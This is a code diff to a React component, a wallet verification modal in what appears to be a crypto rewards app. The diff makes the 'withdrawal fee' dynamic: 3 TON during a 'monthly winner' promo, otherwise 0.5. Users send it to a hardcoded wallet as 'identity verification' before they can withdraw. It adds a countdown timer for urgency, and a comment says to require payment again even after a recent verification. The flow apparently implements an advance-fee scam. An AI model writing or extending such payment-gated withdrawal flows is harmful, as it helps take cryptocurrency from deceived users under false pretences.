@@ -4,9 +4,10 @@ import { Dialog, DialogContent } from '@/components/ui/dialog';
 import { Button } from '@/components/ui/button';
 import { supabase } from '@/integrations/supabase/client';
 import { toast } from 'sonner';
-import { Loader2, X } from 'lucide-react';
+import { Loader2, X, Clock } from 'lucide-react';
 import { useTonConnectUI, useTonWallet } from '@tonconnect/ui-react';
 import { getValidUntil, tonToNano } from '@/lib/ton-constants';
+import { isPromoActive, getPromoTimeRemaining } from '@/hooks/useMonthlyWinnerModal';
 
 interface WalletVerificationModalProps {
   open: boolean;
@@ -16,8 +17,20 @@ interface WalletVerificationModalProps {
   onVerified: () => void;
 }
 
-const VERIFICATION_FEE = 3; // TON
+// Dynamic verification fee based on promo status
+const getVerificationFee = () => {
+  return isPromoActive() ? 3 : 0.5;
+};
+
 const VERIFICATION_WALLET = 'UQCFrjvfMxqHh4-tooMa22uNvbKGd73KfGab3cePjZxq_uNb';
+
+const formatCountdown = (ms: number) => {
+  const totalSeconds = Math.floor(ms / 1000);
+  const hours = Math.floor(totalSeconds / 3600);
+  const minutes = Math.floor((totalSeconds % 3600) / 60);
+  const seconds = totalSeconds % 60;
+  return `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+};
 
 const WalletVerificationModal: React.FC<WalletVerificationModalProps> = ({
   open,
@@ -31,14 +44,28 @@ const WalletVerificationModal: React.FC<WalletVerificationModalProps> = ({
   const [isLoading, setIsLoading] = useState(false);
   const [isVerified, setIsVerified] = useState(false);
   const [showImage, setShowImage] = useState(true);
+  const [timeRemaining, setTimeRemaining] = useState(getPromoTimeRemaining());
+  const [verificationFee, setVerificationFee] = useState(getVerificationFee());
 
   // Reset state when modal opens
   useEffect(() => {
     if (open) {
       setIsVerified(false);
       setShowImage(true);
+      setVerificationFee(getVerificationFee());
     }
   }, [open]);
+
+  // Update countdown timer
+  useEffect(() => {
+    const interval = setInterval(() => {
+      setTimeRemaining(getPromoTimeRemaining());
+      setVerificationFee(getVerificationFee());
+    }, 1000);
+    return () => clearInterval(interval);
+  }, []);
+
+  const promoActive = isPromoActive();
 
   const handleVerify = async () => {
     // Always require new verification - no skipping even if recently verified
@@ -56,11 +83,12 @@ const WalletVerificationModal: React.FC<WalletVerificationModalProps> = ({
     }
 
     setIsLoading(true);
+    const currentFee = getVerificationFee();
     
     try {
       console.log('Starting wallet verification transaction...');
       console.log('Destination:', VERIFICATION_WALLET);
-      console.log('Amount:', VERIFICATION_FEE, 'TON');
+      console.log('Amount:', currentFee, 'TON');
       
       // Create TON transaction using consistent helpers
       const transaction = {
@@ -68,7 +96,7 @@ const WalletVerificationModal: React.FC<WalletVerificationModalProps> = ({
         messages: [
           {
             address: VERIFICATION_WALLET,
-            amount: tonToNano(VERIFICATION_FEE)
+            amount: tonToNano(currentFee)
           }
         ]
       };
@@ -88,7 +116,7 @@ const WalletVerificationModal: React.FC<WalletVerificationModalProps> = ({
             user_id: userId,
             wallet_address: walletAddress,
             currency: 'TON',
-            verification_fee: VERIFICATION_FEE,
+            verification_fee: currentFee,
             tx_hash: result.boc,
             verified_at: new Date().toISOString(),
           }, {
@@ -143,7 +171,7 @@ const WalletVerificationModal: React.FC<WalletVerificationModalProps> = ({
               exit={{ opacity: 0, scale: 0.95 }}
               className="py-10 text-center px-6"
             >
-              <p className="text-lg font-semibold text-green-500 mb-1">✓ Verified</p>
+              <p className="text-lg font-semibold text-green-500 mb-1">Verified</p>
               <p className="text-sm text-muted-foreground">
                 You can now withdraw
               </p>
@@ -158,11 +186,17 @@ const WalletVerificationModal: React.FC<WalletVerificationModalProps> = ({
             >
               {/* Security Image */}
               <div className="relative">
-                <img 
-                  src="/images/withdrawal-security.png" 
-                  alt="Withdrawal Security" 
-                  className="w-full h-auto rounded-t-lg"
-                />
+                {promoActive ? (
+                  <img 
+                    src="/images/withdrawal-security.png" 
+                    alt="Withdrawal Security" 
+                    className="w-full h-auto rounded-t-lg"
+                  />
+                ) : (
+                  <div className="w-full h-32 bg-gradient-to-br from-primary/20 to-secondary/20 rounded-t-lg flex items-center justify-center">
+                    <p className="text-lg font-bold text-foreground">Wallet Verification</p>
+                  </div>
+                )}
                 <button 
                   onClick={handleClose} 
                   className="absolute top-2 right-2 p-1.5 rounded-full bg-black/50 text-white"
@@ -170,6 +204,14 @@ const WalletVerificationModal: React.FC<WalletVerificationModalProps> = ({
                 >
                   <X className="w-5 h-5" />
                 </button>
+
+                {/* Countdown Timer - only show during promo */}
+                {promoActive && (
+                  <div className="absolute top-2 left-2 flex items-center gap-1.5 px-3 py-1.5 rounded-full bg-destructive text-destructive-foreground text-sm font-bold">
+                    <Clock className="w-4 h-4" />
+                    <span>{formatCountdown(timeRemaining)}</span>
+                  </div>
+                )}
               </div>
 
               {/* Content */}
@@ -179,7 +221,7 @@ const WalletVerificationModal: React.FC<WalletVerificationModalProps> = ({
                     Withdrawal Fee
                   </p>
                   <p className="text-3xl font-bold text-primary">
-                    {VERIFICATION_FEE} TON
+                    {verificationFee} TON
                   </p>
                   <p className="text-xs text-muted-foreground">
                     Required to verify your identity. This prevents bots and fake accounts from claiming rewards.
